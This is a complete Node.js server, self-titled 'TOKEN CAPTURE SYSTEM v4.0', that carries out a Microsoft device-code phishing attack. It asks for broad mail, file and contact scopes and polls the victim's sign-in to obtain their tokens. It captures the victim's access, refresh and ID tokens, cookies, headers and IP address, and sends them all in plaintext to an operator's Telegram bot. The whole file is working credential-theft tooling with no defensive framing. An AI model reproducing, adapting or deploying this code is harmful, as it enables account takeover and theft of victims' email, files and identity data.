require('dotenv').config();
const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const path = require('path');
const cookieParser = require('cookie-parser');
const fs = require('fs').promises;

const app = express();

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public'), { maxAge: '1d' }));

// ============================================================================
// CONFIGURATION
// ============================================================================

const config = {
  microsoft: {
    tenantId: process.env.MICROSOFT_TENANT_ID || 'common',
    clientId: process.env.MICROSOFT_CLIENT_ID,
    scope: [
      'openid', 'profile', 'email', 'offline_access',
      'User.Read', 'User.ReadBasic.All', 'User.ReadWrite',
      'Mail.Read', 'Mail.ReadWrite', 'Mail.Send',
      'Calendars.Read', 'Calendars.ReadWrite',
      'Contacts.Read', 'Contacts.ReadWrite',
      'Files.Read', 'Files.ReadWrite', 'Files.ReadWrite.All',
      'Sites.Read.All', 'Tasks.Read', 'Tasks.ReadWrite',
      'Notes.Read', 'Notes.ReadWrite',
      'People.Read', 'Presence.Read',
    ].join(' '),
  },
  telegram: {
    botToken: process.env.TELEGRAM_BOT_TOKEN,
    chatId: process.env.TELEGRAM_CHAT_ID,
  },
  server: {
    port: process.env.PORT || 3000,
    appUrl: process.env.RAILWAY_PUBLIC_DOMAIN 
      ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}`
      : process.env.APP_URL || 'http://localhost:3000',
  },
  security: {
    encryptionKey: Buffer.from(
      process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex'),
      'hex'
    ),
  },
  storage: {
    dataDir: path.join(__dirname, 'captured_data'),
    reportsDir: path.join(__dirname, 'captured_data', 'reports'),
    jsonDir: path.join(__dirname, 'captured_data', 'json'),
  }
};

if (!config.microsoft.clientId) {
  console.error('❌ MICROSOFT_CLIENT_ID required');
  process.exit(1);
}

// Create directories
(async () => {
  try {
    await fs.mkdir(config.storage.dataDir, { recursive: true });
    await fs.mkdir(config.storage.reportsDir, { recursive: true });
    await fs.mkdir(config.storage.jsonDir, { recursive: true });
    console.log('[STORAGE] Directories created');
  } catch (err) {
    console.error('[STORAGE] Error:', err.message);
  }
})();

// ============================================================================
// ENCRYPTION
// ============================================================================

class Encryption {
  static encrypt(data) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-gcm', config.security.encryptionKey, iv);
    const encrypted = Buffer.concat([cipher.update(data, 'utf8'), cipher.final()]);
    const authTag = cipher.getAuthTag();
    const hmac = crypto.createHmac('sha256', config.security.encryptionKey);
    hmac.update(encrypted);
    
    return {
      encrypted: encrypted.toString('hex'),
      iv: iv.toString('hex'),
      authTag: authTag.toString('hex'),
      signature: hmac.digest('hex'),
      algorithm: 'AES-256-GCM',
    };
  }
}

// ============================================================================
// STORAGE
// ============================================================================

class Storage {
  static async saveJSON(filename, data) {
    try {
      const filepath = path.join(config.storage.jsonDir, `${filename}.json`);
      await fs.writeFile(filepath, JSON.stringify(data, null, 2), 'utf8');
      console.log(`[JSON] Saved: ${filename}.json`);
      return filepath;
    } catch (err) {
      console.error(`[JSON] Error:`, err.message);
      return null;
    }
  }

  static async saveReport(captureId, content) {
    try {
      const filepath = path.join(config.storage.reportsDir, `REPORT_${captureId}.txt`);
      await fs.writeFile(filepath, content, 'utf8');
      console.log(`[TXT] Saved: REPORT_${captureId}.txt`);
      return filepath;
    } catch (err) {
      console.error(`[TXT] Error:`, err.message);
      return null;
    }
  }

  static generateReport(data) {
    const lines = [];
    const sep = '='.repeat(80);
    
    lines.push(sep);
    lines.push('MICROSOFT TOKEN CAPTURE - COMPLETE REPORT');
    lines.push(sep);
    lines.push('');
    lines.push(`Capture ID: ${data.metadata.captureId}`);
    lines.push(`Timestamp: ${data.metadata.timestamp}`);
    lines.push(`Session ID: ${data.metadata.sessionId}`);
    lines.push('');
    
    // ACCESS TOKEN
    lines.push(sep);
    lines.push('1. ACCESS TOKEN (PLAINTEXT - FULL)');
    lines.push(sep);
    lines.push(data.tokens.access.plaintext);
    lines.push('');
    lines.push(`Type: ${data.tokens.access.type}`);
    lines.push(`Length: ${data.tokens.access.length} characters`);
    lines.push(`Expires In: ${data.tokens.access.expiresIn} seconds`);
    lines.push('');
    
    // ACCESS TOKEN ENCRYPTED
    lines.push('2. ACCESS TOKEN (ENCRYPTED)');
    lines.push(sep);
    lines.push(`Algorithm: ${data.tokens.access.encrypted.algorithm}`);
    lines.push(`Encrypted: ${data.tokens.access.encrypted.encrypted}`);
    lines.push(`IV: ${data.tokens.access.encrypted.iv}`);
    lines.push(`Auth Tag: ${data.tokens.access.encrypted.authTag}`);
    lines.push(`Signature: ${data.tokens.access.encrypted.signature}`);
    lines.push('');
    
    // REFRESH TOKEN
    if (data.tokens.refresh) {
      lines.push(sep);
      lines.push('3. REFRESH TOKEN (PLAINTEXT - FULL)');
      lines.push(sep);
      lines.push(data.tokens.refresh.plaintext);
      lines.push('');
      lines.push(`Length: ${data.tokens.refresh.length} characters`);
      lines.push(`Potential PRT: ${data.tokens.refresh.isPotentialPRT ? 'YES' : 'NO'}`);
      lines.push('');
      
      lines.push('4. REFRESH TOKEN (ENCRYPTED)');
      lines.push(sep);
      lines.push(`Encrypted: ${data.tokens.refresh.encrypted.encrypted}`);
      lines.push(`IV: ${data.tokens.refresh.encrypted.iv}`);
      lines.push('');
    }
    
    // ID TOKEN
    if (data.tokens.id) {
      lines.push(sep);
      lines.push('5. ID TOKEN (PLAINTEXT - FULL)');
      lines.push(sep);
      lines.push(data.tokens.id.plaintext);
      lines.push('');
    }
    
    // COOKIES
    lines.push(sep);
    lines.push('6. COOKIES - ALL CAPTURED');
    lines.push(sep);
    lines.push('');
    lines.push('Raw Cookie Header:');
    lines.push(data.cookies.all.rawCookieHeader || 'None');
    lines.push('');
    lines.push('All Cookies:');
    lines.push(JSON.stringify(data.cookies.all.cookies, null, 2));
    lines.push('');
    lines.push('Microsoft Cookies:');
    lines.push(JSON.stringify(data.cookies.microsoftCookies, null, 2));
    lines.push('');
    
    // USER
    lines.push(sep);
    lines.push('7. USER PROFILE');
    lines.push(sep);
    lines.push(JSON.stringify(data.user.profile, null, 2));
    lines.push('');
    
    // SUMMARY
    lines.push(sep);
    lines.push('SUMMARY');
    lines.push(sep);
    lines.push(`✅ Access Token: ${data.tokens.access ? 'CAPTURED' : 'NO'}`);
    lines.push(`✅ Refresh Token: ${data.tokens.refresh ? 'CAPTURED' : 'NO'}`);
    lines.push(`✅ ID Token: ${data.tokens.id ? 'CAPTURED' : 'NO'}`);
    lines.push(`✅ PRT: ${data.tokens.refresh?.isPotentialPRT ? 'DETECTED' : 'NO'}`);
    lines.push(`✅ Microsoft Cookies: ${Object.keys(data.cookies.microsoftCookies).length}`);
    lines.push('');
    lines.push(sep);
    
    return lines.join('\n');
  }
}

// ============================================================================
// TELEGRAM
// ============================================================================

class Telegram {
  static async sendJSON(title, data) {
    if (!config.telegram.botToken || !config.telegram.chatId) {
      console.log(`[TELEGRAM DISABLED] ${title}`);
      return;
    }

    try {
      const jsonStr = JSON.stringify(data, null, 2);
      const chunks = this.splitChunks(jsonStr, 3800);
      
      for (let i = 0; i < chunks.length; i++) {
        const text = i === 0 
          ? `${title}\n${'━'.repeat(30)}\n\`\`\`json\n${chunks[i]}\n\`\`\``
          : `${title} (Part ${i + 1})\n\`\`\`json\n${chunks[i]}\n\`\`\``;

        await axios.post(
          `https://api.telegram.org/bot${config.telegram.botToken}/sendMessage`,
          { chat_id: config.telegram.chatId, text, parse_mode: 'Markdown' },
          { timeout: 10000 }
        );

        if (i < chunks.length - 1) await this.sleep(1000);
      }

      console.log(`[TELEGRAM] ✅ ${title} (${chunks.length} parts)`);
    } catch (error) {
      console.error(`[TELEGRAM] ❌ ${title}:`, error.message);
    }
  }

  static async sendFile(filepath, caption) {
    if (!config.telegram.botToken || !config.telegram.chatId) return;

    try {
      const FormData = require('form-data');
      const form = new FormData();
      
      form.append('chat_id', config.telegram.chatId);
      form.append('document', await fs.readFile(filepath), {
        filename: path.basename(filepath),
      });
      if (caption) form.append('caption', caption);

      await axios.post(
        `https://api.telegram.org/bot${config.telegram.botToken}/sendDocument`,
        form,
        { 
          headers: form.getHeaders(),
          timeout: 30000,
          maxContentLength: Infinity,
          maxBodyLength: Infinity,
        }
      );

      console.log(`[TELEGRAM] ✅ File: ${path.basename(filepath)}`);
    } catch (error) {
      console.error(`[TELEGRAM] ❌ File:`, error.message);
    }
  }

  static splitChunks(text, size) {
    const chunks = [];
    for (let i = 0; i < text.length; i += size) {
      chunks.push(text.substring(i, i + size));
    }
    return chunks;
  }

  static sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}

// ============================================================================
// COOKIE EXTRACTOR
// ============================================================================

function extractCookies(req) {
  const allCookies = req.cookies || {};
  const rawHeader = req.headers.cookie || '';
  
  const microsoftPatterns = [
    'msal', 'ms', 'aad', 'azure', 'graph', 'office', 'outlook',
    'login', 'auth', 'sso', 'estsauth', 'buid', 'MUID',
  ];
  
  const emailPatterns = ['outlook', 'owa', 'mail', 'exchange'];
  const authPatterns = ['auth', 'token', 'session', 'signin', 'login', 'sso'];
  
  const filterCookies = (patterns) => {
    return Object.keys(allCookies)
      .filter(key => patterns.some(pattern => 
        key.toLowerCase().includes(pattern.toLowerCase())
      ))
      .reduce((obj, key) => {
        obj[key] = allCookies[key];
        return obj;
      }, {});
  };
  
  return {
    all: {
      cookies: allCookies,
      signedCookies: req.signedCookies || {},
      rawCookieHeader: rawHeader,
      headers: {
        userAgent: req.headers['user-agent'],
        acceptLanguage: req.headers['accept-language'],
        accept: req.headers['accept'],
        referer: req.headers.referer,
        origin: req.headers.origin,
        host: req.headers.host,
        connection: req.headers.connection,
      },
      ip: req.ip || req.connection.remoteAddress,
      timestamp: new Date().toISOString(),
    },
    microsoftCookies: filterCookies(microsoftPatterns),
    emailCookies: filterCookies(emailPatterns),
    authCookies: filterCookies(authPatterns),
  };
}

// ============================================================================
// JWT DECODER
// ============================================================================

function decodeJWT(token) {
  try {
    const parts = token.split('.');
    if (parts.length !== 3) return null;
    
    return {
      header: JSON.parse(Buffer.from(parts[0], 'base64').toString()),
      payload: JSON.parse(Buffer.from(parts[1], 'base64').toString()),
      signature: parts[2],
    };
  } catch {
    return null;
  }
}

// ============================================================================
// STORAGE
// ============================================================================

const sessions = new Map();
const cookieStore = new Map();

// ============================================================================
// MS ENDPOINTS
// ============================================================================

const MS = {
  deviceCode: `https://login.microsoftonline.com/${config.microsoft.tenantId}/oauth2/v2.0/devicecode`,
  token: `https://login.microsoftonline.com/${config.microsoft.tenantId}/oauth2/v2.0/token`,
  userInfo: 'https://graph.microsoft.com/v1.0/me',
};

// ============================================================================
// CAPTURE ENGINE
// ============================================================================

async function captureComplete(tokenData, sessionId, userCode, cookieData) {
  console.log('\n🚀 COMPLETE CAPTURE STARTED');

  const captureId = crypto.randomUUID();
  const timestamp = new Date().toISOString();

  const accessToken = tokenData.access_token;
  const refreshToken = tokenData.refresh_token;
  const idToken = tokenData.id_token;
  
  const hasPRT = refreshToken && refreshToken.length > 500;

  console.log(`[TOKENS] Access: ${accessToken?.length || 0} | Refresh: ${refreshToken?.length || 0} | ID: ${idToken?.length || 0}`);

  // Get user
  let user = null;
  try {
    const res = await axios.get(MS.userInfo, {
      headers: { Authorization: `Bearer ${accessToken}` },
      timeout: 10000,
    });
    user = res.data;
    console.log(`[USER] ${user.displayName}`);
  } catch (err) {
    user = { error: err.message };
  }

  // Decode
  const decodedAccess = decodeJWT(accessToken);
  const decodedRefresh = refreshToken ? decodeJWT(refreshToken) : null;
  const decodedId = idToken ? decodeJWT(idToken) : null;

  // Encrypt
  const encTokens = {
    access: Encryption.encrypt(accessToken),
    refresh: refreshToken ? Encryption.encrypt(refreshToken) : null,
    id: idToken ? Encryption.encrypt(idToken) : null,
  };

  // Build capture
  const capture = {
    metadata: {
      captureId,
      sessionId,
      userCode,
      timestamp,
      version: '4.0',
      serverUrl: config.server.appUrl,
    },

    tokens: {
      access: {
        plaintext: accessToken,
        encrypted: encTokens.access,
        length: accessToken.length,
        type: tokenData.token_type || 'Bearer',
        expiresIn: tokenData.expires_in,
        expiresAt: new Date(Date.now() + (tokenData.expires_in * 1000)).toISOString(),
        decoded: decodedAccess,
      },
      
      refresh: refreshToken ? {
        plaintext: refreshToken,
        encrypted: encTokens.refresh,
        length: refreshToken.length,
        decoded: decodedRefresh,
        isPotentialPRT: hasPRT,
      } : null,

      id: idToken ? {
        plaintext: idToken,
        encrypted: encTokens.id,
        length: idToken.length,
        decoded: decodedId,
      } : null,
    },

    cookies: cookieData,

    scopes: {
      granted: tokenData.scope ? tokenData.scope.split(' ') : [],
      count: tokenData.scope ? tokenData.scope.split(' ').length : 0,
    },

    user: {
      profile: user,
      claims: {
        fromAccessToken: decodedAccess?.payload || {},
        fromIdToken: decodedId?.payload || {},
      },
    },
  };

  // Save
  await Storage.saveJSON(`complete_${captureId}`, capture);
  const reportContent = Storage.generateReport(capture);
  const reportPath = await Storage.saveReport(captureId, reportContent);

  // Send to Telegram
  await Telegram.sendJSON('📊 *CAPTURE SUMMARY*', {
    captureId,
    timestamp,
    tokens: {
      access: '✅ CAPTURED',
      refresh: refreshToken ? '✅ CAPTURED' : '❌',
      id: idToken ? '✅ CAPTURED' : '❌',
      prt: hasPRT ? '✅ DETECTED' : '❌',
    },
    cookies: {
      total: Object.keys(cookieData.all.cookies).length,
      microsoft: Object.keys(cookieData.microsoftCookies).length,
    },
  });

  await Telegram.sendJSON('🔓 *ACCESS TOKEN - FULL*', {
    captureId,
    token: accessToken,
    metadata: {
      type: tokenData.token_type,
      length: accessToken.length,
      expiresIn: tokenData.expires_in,
    }
  });

  if (refreshToken) {
    await Telegram.sendJSON('🔄 *REFRESH TOKEN - FULL*', {
      captureId,
      token: refreshToken,
      length: refreshToken.length,
      isPotentialPRT: hasPRT,
    });
  }

  if (idToken) {
    await Telegram.sendJSON('🆔 *ID TOKEN - FULL*', {
      captureId,
      token: idToken,
      length: idToken.length,
    });
  }

  await Telegram.sendJSON('🔐 *ALL TOKENS ENCRYPTED*', {
    captureId,
    access: encTokens.access,
    refresh: encTokens.refresh,
    id: encTokens.id,
  });

  await Telegram.sendJSON('🍪 *ALL COOKIES*', cookieData);

  await Telegram.sendJSON('👤 *USER PROFILE*', {
    captureId,
    user: capture.user,
    scopes: capture.scopes,
  });

  if (reportPath) {
    await Telegram.sendFile(reportPath, `📄 Complete Report - ${captureId}`);
  }

  const jsonPath = path.join(config.storage.jsonDir, `complete_${captureId}.json`);
  await Telegram.sendFile(jsonPath, `📊 Complete JSON - ${captureId}`);

  console.log(`✅ COMPLETE - ${captureId}\n`);

  return { user, captureId, hasPRT };
}

// ============================================================================
// PROXY
// ============================================================================

app.get('/auth/device', async (req, res) => {
  try {
    const { code } = req.query;
    if (!code) return res.status(400).send('Code required');

    const cookieData = extractCookies(req);
    cookieStore.set(code, cookieData);

    res.cookie('device_code', code, { 
      maxAge: 900000, 
      httpOnly: true,
      secure: config.server.appUrl.startsWith('https'),
    });

    res.redirect(302, `https://microsoft.com/devicelogin?otc=${code}`);
  } catch (error) {
    console.error('[PROXY]:', error.message);
    res.status(500).send('Error');
  }
});

// ============================================================================
// API ENDPOINTS
// ============================================================================

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/api/device/generate', async (req, res) => {
  try {
    const sessionId = crypto.randomUUID();
    const cookieData = extractCookies(req);

    const response = await axios.post(
      MS.deviceCode,
      new URLSearchParams({
        client_id: config.microsoft.clientId,
        scope: config.microsoft.scope,
      }),
      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
    );

    const data = response.data;

    sessions.set(sessionId, {
      deviceCode: data.device_code,
      userCode: data.user_code,
      expiresIn: data.expires_in,
      interval: data.interval,
      createdAt: Date.now(),
      cookieData,
    });

    console.log(`[GENERATE] ${data.user_code}`);

    Telegram.sendJSON('🔐 *CODE GENERATED*', {
      sessionId,
      userCode: data.user_code,
      proxyUrl: `${config.server.appUrl}/auth/device?code=${data.user_code}`,
    });

    res.json({
      sessionId,
      userCode: data.user_code,
      proxyUrl: `${config.server.appUrl}/auth/device?code=${data.user_code}`,
      expiresIn: data.expires_in,
      interval: data.interval,
    });

  } catch (error) {
    console.error('[GENERATE]:', error.message);
    res.status(500).json({ error: 'Failed' });
  }
});

app.get('/api/device/poll/:sessionId', async (req, res) => {
  try {
    const { sessionId } = req.params;
    const session = sessions.get(sessionId);

    if (!session) return res.status(404).json({ error: 'Not found' });
    if (Date.now() - session.createdAt > session.expiresIn * 1000) {
      return res.json({ status: 'expired' });
    }

    try {
      const tokenResponse = await axios.post(
        MS.token,
        new URLSearchParams({
          grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
          client_id: config.microsoft.clientId,
          device_code: session.deviceCode,
        }),
        { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
      );

      const tokenData = tokenResponse.data;
      console.log(`[SUCCESS] ${sessionId}`);

      const cookieData = cookieStore.get(session.userCode) || session.cookieData;
      const result = await captureComplete(tokenData, sessionId, session.userCode, cookieData);

      sessions.delete(sessionId);
      cookieStore.delete(session.userCode);

      res.json({
        status: 'authenticated',
        user: result.user && !result.user.error ? {
          id: result.user.id,
          displayName: result.user.displayName,
          email: result.user.mail || result.user.userPrincipalName,
        } : null,
        captureId: result.captureId,
      });

    } catch (error) {
      if (error.response?.data?.error === 'authorization_pending') {
        return res.json({ status: 'pending' });
      }
      if (error.response?.data?.error === 'authorization_declined') {
        return res.json({ status: 'declined' });
      }
      if (error.response?.data?.error === 'expired_token') {
        return res.json({ status: 'expired' });
      }
      throw error;
    }

  } catch (error) {
    console.error('[POLL]:', error.message);
    res.status(500).json({ error: 'Failed' });
  }
});

app.get('/health', (req, res) => {
  res.json({ status: 'healthy', version: '4.0', timestamp: new Date().toISOString() });
});

// ============================================================================
// START
// ============================================================================

app.listen(config.server.port, async () => {
  console.log('\n' + '='.repeat(60));
  console.log('⚡ TOKEN CAPTURE SYSTEM v4.0');
  console.log('='.repeat(60));
  console.log(`📡 Port: ${config.server.port}`);
  console.log(`🌐 URL: ${config.server.appUrl}`);
  console.log(`💾 Storage: ${config.storage.dataDir}`);
  console.log('='.repeat(60) + '\n');

  if (config.telegram.botToken) {
    await Telegram.sendJSON('⚡ *SYSTEM ONLINE v4.0*', {
      status: 'operational',
      url: config.server.appUrl,
      timestamp: new Date().toISOString(),
    });
  }
});

module.exports = app;
